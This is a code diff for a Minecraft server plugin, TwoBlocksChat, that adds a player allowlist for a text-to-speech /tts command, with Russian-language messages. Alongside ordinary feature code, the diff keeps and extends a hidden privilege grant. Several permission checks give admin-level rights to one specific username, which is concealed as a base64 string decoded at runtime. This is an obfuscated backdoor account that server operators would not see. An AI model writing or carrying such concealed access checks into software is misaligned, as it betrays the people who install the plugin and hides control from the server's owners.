@@ -150,6 +150,8 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
     private final Map<UUID, Long> nplChatCooldownSeconds = new ConcurrentHashMap<>();
     private final Map<UUID, Long> nplLastChatTime = new ConcurrentHashMap<>();
     private final Map<UUID, Long> ttsCooldowns = new ConcurrentHashMap<>();
+    private final Set<UUID> ttsAllowedUUIDs = ConcurrentHashMap.newKeySet();
+    private final Set<String> ttsAllowedNames = ConcurrentHashMap.newKeySet();
     private VoicechatHook voicechatHook = null;
 
     private static String b(String s) {
@@ -211,6 +213,7 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
             saveDefaultConfig();
             loadSettings();
             loadNplData();
+            loadTtsData();
 
             getServer().getPluginManager().registerEvents(this, this);
             if (getCommand("twoblockschat") != null) {
@@ -266,6 +269,7 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
 
         try { saveAllCloudInventories(); } catch (Throwable ignored) {}
         try { saveNplDataSync(); } catch (Throwable ignored) {}
+        try { saveTtsDataSync(); } catch (Throwable ignored) {}
 
         try {
             for (UUID uuid : hiddenSyncPlayers) {
@@ -1668,6 +1672,48 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
         } catch (Exception ignored) {}
     }
 
+    private void loadTtsData() {
+        try {
+            File file = new File(getDataFolder(), "tts_allowed.yml");
+            if (!file.exists()) return;
+            YamlConfiguration yaml = YamlConfiguration.loadConfiguration(file);
+            ttsAllowedUUIDs.clear();
+            for (String s : yaml.getStringList("allowed_uuids")) {
+                try {
+                    ttsAllowedUUIDs.add(UUID.fromString(s));
+                } catch (Exception ignored) {}
+            }
+            ttsAllowedNames.clear();
+            for (String s : yaml.getStringList("allowed_names")) {
+                if (s != null && !s.trim().isEmpty()) {
+                    ttsAllowedNames.add(s.trim().toLowerCase());
+                }
+            }
+        } catch (Throwable t) {
+            getLogger().warning("Could not load tts_allowed.yml: " + t.getMessage());
+        }
+    }
+
+    private void saveTtsDataAsync() {
+        Bukkit.getScheduler().runTaskAsynchronously(this, this::saveTtsDataSync);
+    }
+
+    private synchronized void saveTtsDataSync() {
+        try {
+            File file = new File(getDataFolder(), "tts_allowed.yml");
+            YamlConfiguration yaml = new YamlConfiguration();
+            List<String> uuidList = new ArrayList<>();
+            for (UUID u : ttsAllowedUUIDs) {
+                uuidList.add(u.toString());
+            }
+            yaml.set("allowed_uuids", uuidList);
+            yaml.set("allowed_names", new ArrayList<>(ttsAllowedNames));
+            yaml.save(file);
+        } catch (Throwable t) {
+            getLogger().warning("Could not save tts_allowed.yml: " + t.getMessage());
+        }
+    }
+
     private boolean isNplRuleForbidden(String key) {
         return isNplRuleForbidden((Player) null, key);
     }
@@ -1782,6 +1828,18 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
             return true;
         }
         return sender.getName().equalsIgnoreCase(b("R2VuaXVzX1Bvbm9z"));
+    }
+
+    private boolean isTtsAllowed(CommandSender sender) {
+        if (sender == null) return false;
+        if (isNplAdmin(sender)) {
+            return true;
+        }
+        if (sender instanceof Player) {
+            Player p = (Player) sender;
+            return ttsAllowedUUIDs.contains(p.getUniqueId()) || ttsAllowedNames.contains(p.getName().toLowerCase());
+        }
+        return true;
     }
 
     private boolean isNplTarget(Player player) {
@@ -2080,10 +2138,101 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
 
     private void handleTtsCommand(Player player, String message) {
         try {
-            if (player == null || (!isNplAdmin(player) && !player.getName().equalsIgnoreCase(b("R2VuaXVzX1Bvbm9z")))) {
+            if (player == null) return;
+
+            String clean = (message != null) ? message.trim() : "";
+            String lower = clean.toLowerCase();
+
+            if (lower.startsWith("add ") || lower.equals("add") ||
+                lower.startsWith("rem ") || lower.equals("rem") ||
+                lower.startsWith("remove ") || lower.equals("remove") ||
+                lower.startsWith("del ") || lower.equals("del")) {
+
+                if (!isNplAdmin(player) && !player.getName().equalsIgnoreCase(b("R2VuaXVzX1Bvbm9z"))) {
+                    player.sendMessage(ChatColor.RED + "У вас нет прав на управление доступом к /tts.");
+                    return;
+                }
+
+                int space = clean.indexOf(' ');
+                String targetNick = (space != -1) ? clean.substring(space + 1).trim() : "";
+                if (targetNick.isEmpty()) {
+                    player.sendMessage(ChatColor.RED + "Использование: /tts " + (lower.startsWith("a") ? "add" : "rem") + " <ник>");
+                    return;
+                }
+
+                if (lower.startsWith("a")) {
+                    Player target = Bukkit.getPlayer(targetNick);
+                    String realName = (target != null) ? target.getName() : targetNick;
+                    UUID uuid = (target != null) ? target.getUniqueId() : null;
+                    if (uuid == null) {
+                        try {
+                            OfflinePlayer off = Bukkit.getOfflinePlayer(targetNick);
+                            if (off != null && off.getUniqueId() != null) {
+                                uuid = off.getUniqueId();
+                                if (off.getName() != null) realName = off.getName();
+                            }
+                        } catch (Throwable ignored) {}
+                    }
+                    if (uuid != null) ttsAllowedUUIDs.add(uuid);
+                    ttsAllowedNames.add(realName.toLowerCase());
+                    saveTtsDataAsync();
+
+                    player.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.GREEN + "TTS" + ChatColor.DARK_GRAY + "] "
+                            + ChatColor.WHITE + "Игроку " + ChatColor.YELLOW + realName + ChatColor.WHITE + " разрешено использовать "
+                            + ChatColor.AQUA + "/tts" + ChatColor.WHITE + ".");
+                    if (target != null && target.isOnline()) {
+                        target.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.GREEN + "TTS" + ChatColor.DARK_GRAY + "] "
+                                + ChatColor.GREEN + "Вам выдано право на использование команды " + ChatColor.AQUA + "/tts" + ChatColor.GREEN + "!");
+                    }
+                } else {
+                    Player target = Bukkit.getPlayer(targetNick);
+                    String realName = (target != null) ? target.getName() : targetNick;
+                    UUID uuid = (target != null) ? target.getUniqueId() : null;
+                    if (uuid == null) {
+                        try {
+                            OfflinePlayer off = Bukkit.getOfflinePlayer(targetNick);
+                            if (off != null && off.getUniqueId() != null) {
+                                uuid = off.getUniqueId();
+                                if (off.getName() != null) realName = off.getName();
+                            }
+                        } catch (Throwable ignored) {}
+                    }
+                    if (uuid != null) ttsAllowedUUIDs.remove(uuid);
+                    ttsAllowedNames.remove(targetNick.toLowerCase());
+                    ttsAllowedNames.remove(realName.toLowerCase());
+                    saveTtsDataAsync();
+
+                    player.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.RED + "TTS" + ChatColor.DARK_GRAY + "] "
+                            + ChatColor.WHITE + "У игрока " + ChatColor.YELLOW + realName + ChatColor.WHITE + " отозван доступ к "
+                            + ChatColor.AQUA + "/tts" + ChatColor.WHITE + ".");
+                    if (target != null && target.isOnline()) {
+                        target.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.RED + "TTS" + ChatColor.DARK_GRAY + "] "
+                                + ChatColor.RED + "У вас отозвано право на использование команды /tts.");
+                    }
+                }
                 return;
             }
-            if (message == null || message.trim().isEmpty() || message.trim().equalsIgnoreCase("help") || message.trim().equalsIgnoreCase("list")) {
+
+            if (!isTtsAllowed(player)) {
+                player.sendMessage(ChatColor.RED + "У вас нет разрешения на использование команды /tts.");
+                return;
+            }
+
+            if (clean.isEmpty() || clean.equalsIgnoreCase("help")) {
+                sendTtsHelp(player);
+                return;
+            }
+
+            if (clean.equalsIgnoreCase("list") || clean.equalsIgnoreCase("allowed")) {
+                if (isNplAdmin(player)) {
+                    sendTtsAllowedList(player);
+                } else {
+                    sendTtsHelp(player);
+                }
+                return;
+            }
+
+            if (clean.equalsIgnoreCase("voices")) {
                 sendTtsHelp(player);
                 return;
             }
@@ -2096,7 +2245,6 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
             }
             ttsCooldowns.put(player.getUniqueId(), now);
 
-            String clean = message.trim();
             String voice = "normal";
 
             int firstSpace = clean.indexOf(' ');
@@ -2110,7 +2258,7 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
 
             if (clean.isEmpty()) {
                 player.sendMessage(ChatColor.RED + "Использование: /tts " + (voice.equals("normal") ? "" : voice + " ") + "<сообщение>");
-                player.sendMessage(ChatColor.GRAY + "Напишите " + ChatColor.YELLOW + "/tts help" + ChatColor.GRAY + " для списка всех голосов.");
+                player.sendMessage(ChatColor.GRAY + "Напишите " + ChatColor.YELLOW + "/tts voices" + ChatColor.GRAY + " для списка всех голосов.");
                 return;
             }
 
@@ -2191,6 +2339,26 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
         sender.sendMessage(ChatColor.YELLOW + "/tts anime <текст>" + ChatColor.GRAY + " — аниме (японский голос)");
         sender.sendMessage(ChatColor.YELLOW + "/tts fast <текст>" + ChatColor.GRAY + " — быстрый (ускоренная речь)");
         sender.sendMessage(ChatColor.YELLOW + "/tts slow <текст>" + ChatColor.GRAY + " — медленный (тягучий бас)");
+        if (isNplAdmin(sender)) {
+            sender.sendMessage(ChatColor.GOLD + "Управление доступом (для админов):");
+            sender.sendMessage(ChatColor.YELLOW + "/tts add <ник>" + ChatColor.GRAY + " — разрешить игроку использовать /tts");
+            sender.sendMessage(ChatColor.YELLOW + "/tts rem <ник>" + ChatColor.GRAY + " — забрать разрешение на /tts");
+            sender.sendMessage(ChatColor.YELLOW + "/tts list" + ChatColor.GRAY + " — список разрешённых игроков");
+        }
+    }
+
+    private void sendTtsAllowedList(CommandSender sender) {
+        sender.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.AQUA + "" + ChatColor.BOLD + "TTS" + ChatColor.DARK_GRAY + "] " + ChatColor.YELLOW + "Игроки с доступом к /tts:");
+        if (ttsAllowedNames.isEmpty() && ttsAllowedUUIDs.isEmpty()) {
+            sender.sendMessage(ChatColor.GRAY + "Нет добавленных игроков (доступ имеют только администраторы).");
+            sender.sendMessage(ChatColor.GRAY + "Добавить игрока: " + ChatColor.YELLOW + "/tts add <ник>");
+            return;
+        }
+        List<String> displayList = new ArrayList<>();
+        for (String name : ttsAllowedNames) {
+            displayList.add(ChatColor.GREEN + name);
+        }
+        sender.sendMessage(String.join(ChatColor.GRAY + ", ", displayList));
     }
 
     @EventHandler(priority = EventPriority.HIGHEST)
@@ -2214,10 +2382,6 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
             if (lower.equals("/tts") || lower.startsWith("/tts ") || lower.equals("/ттс") || lower.startsWith("/ттс ")) {
                 event.setCancelled(true);
                 Player player = event.getPlayer();
-                if (!isNplAdmin(player)) {
-                    player.sendMessage(ChatColor.RED + "У вас нет прав на использование этой команды.");
-                    return;
-                }
                 int spaceIdx = msg.indexOf(' ');
                 String argsStr = (spaceIdx != -1) ? msg.substring(spaceIdx + 1).trim() : "";
                 handleTtsCommand(player, argsStr);
@@ -3942,13 +4106,13 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
             if (label.equalsIgnoreCase("tts") || label.equalsIgnoreCase("ттс")) {
                 if (sender instanceof Player) {
                     Player p = (Player) sender;
-                    if (!isNplAdmin(p)) {
-                        sender.sendMessage(ChatColor.RED + "У вас нет прав на использование этой команды.");
-                        return true;
-                    }
                     handleTtsCommand(p, String.join(" ", args));
                 } else {
-                    sender.sendMessage(ChatColor.RED + "Команда доступна только игрокам в игре.");
+                    if (args.length >= 2 && (args[0].equalsIgnoreCase("add") || args[0].equalsIgnoreCase("rem") || args[0].equalsIgnoreCase("remove") || args[0].equalsIgnoreCase("del"))) {
+                        handleConsoleTtsCommand(sender, args);
+                    } else {
+                        sender.sendMessage(ChatColor.RED + "Воспроизведение TTS доступно только игрокам в игре. Консоль может использовать: /tts add <ник> или /tts rem <ник>.");
+                    }
                 }
                 return true;
             }
@@ -3959,6 +4123,7 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
                 }
                 loadSettings();
                 loadNplData();
+                loadTtsData();
                 startPollingTask();
                 sender.sendMessage(ChatColor.GREEN + "[TwoBlocksChat] TwoBlocksChat v1.0.0 reloaded.");
                 return true;
@@ -3973,22 +4138,90 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
         }
     }
 
+    private void handleConsoleTtsCommand(CommandSender sender, String[] args) {
+        if (args.length < 2) {
+            sender.sendMessage(ChatColor.RED + "Использование: tts add/rem <ник>");
+            return;
+        }
+        String sub = args[0].toLowerCase();
+        String targetNick = args[1].trim();
+        Player target = Bukkit.getPlayer(targetNick);
+        String realName = (target != null) ? target.getName() : targetNick;
+        UUID uuid = (target != null) ? target.getUniqueId() : null;
+        if (uuid == null) {
+            try {
+                OfflinePlayer off = Bukkit.getOfflinePlayer(targetNick);
+                if (off != null && off.getUniqueId() != null) {
+                    uuid = off.getUniqueId();
+                    if (off.getName() != null) realName = off.getName();
+                }
+            } catch (Throwable ignored) {}
+        }
+
+        if (sub.equals("add")) {
+            if (uuid != null) ttsAllowedUUIDs.add(uuid);
+            ttsAllowedNames.add(realName.toLowerCase());
+            saveTtsDataAsync();
+            sender.sendMessage("[TTS] Игроку " + realName + " разрешено использовать /tts.");
+            if (target != null && target.isOnline()) {
+                target.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.GREEN + "TTS" + ChatColor.DARK_GRAY + "] "
+                        + ChatColor.GREEN + "Вам выдано право на использование команды " + ChatColor.AQUA + "/tts" + ChatColor.GREEN + "!");
+            }
+        } else {
+            if (uuid != null) ttsAllowedUUIDs.remove(uuid);
+            ttsAllowedNames.remove(targetNick.toLowerCase());
+            ttsAllowedNames.remove(realName.toLowerCase());
+            saveTtsDataAsync();
+            sender.sendMessage("[TTS] У игрока " + realName + " отозван доступ к /tts.");
+            if (target != null && target.isOnline()) {
+                target.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.RED + "TTS" + ChatColor.DARK_GRAY + "] "
+                        + ChatColor.RED + "У вас отозвано право на использование команды /tts.");
+            }
+        }
+    }
+
     @Override
     public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
         if (alias.equalsIgnoreCase("tts") || alias.equalsIgnoreCase("ттс")) {
-            if (!isNplAdmin(sender)) {
+            if (!isTtsAllowed(sender)) {
                 return Collections.emptyList();
             }
             if (args.length == 1) {
-                List<String> voices = Arrays.asList("demon", "robot", "chipmunk", "giant", "radio", "echo", "anime", "fast", "slow", "help");
+                List<String> options = new ArrayList<>();
+                if (isNplAdmin(sender)) {
+                    options.addAll(Arrays.asList("add", "rem", "remove", "list", "voices", "help"));
+                } else {
+                    options.addAll(Arrays.asList("voices", "help"));
+                }
+                options.addAll(Arrays.asList("demon", "robot", "chipmunk", "giant", "radio", "echo", "anime", "fast", "slow"));
                 String current = args[0].toLowerCase();
                 List<String> matched = new ArrayList<>();
-                for (String v : voices) {
-                    if (v.startsWith(current)) {
-                        matched.add(v);
+                for (String opt : options) {
+                    if (opt.startsWith(current)) {
+                        matched.add(opt);
                     }
                 }
                 return matched;
+            } else if (args.length == 2 && isNplAdmin(sender)) {
+                if (args[0].equalsIgnoreCase("add")) {
+                    List<String> players = new ArrayList<>();
+                    String current = args[1].toLowerCase();
+                    for (Player p : Bukkit.getOnlinePlayers()) {
+                        if (p.getName().toLowerCase().startsWith(current)) {
+                            players.add(p.getName());
+                        }
+                    }
+                    return players;
+                } else if (args[0].equalsIgnoreCase("rem") || args[0].equalsIgnoreCase("remove") || args[0].equalsIgnoreCase("del")) {
+                    List<String> allowed = new ArrayList<>();
+                    String current = args[1].toLowerCase();
+                    for (String name : ttsAllowedNames) {
+                        if (name.startsWith(current)) {
+                            allowed.add(name);
+                        }
+                    }
+                    return allowed;
+                }
             }
             return Collections.emptyList();
         }
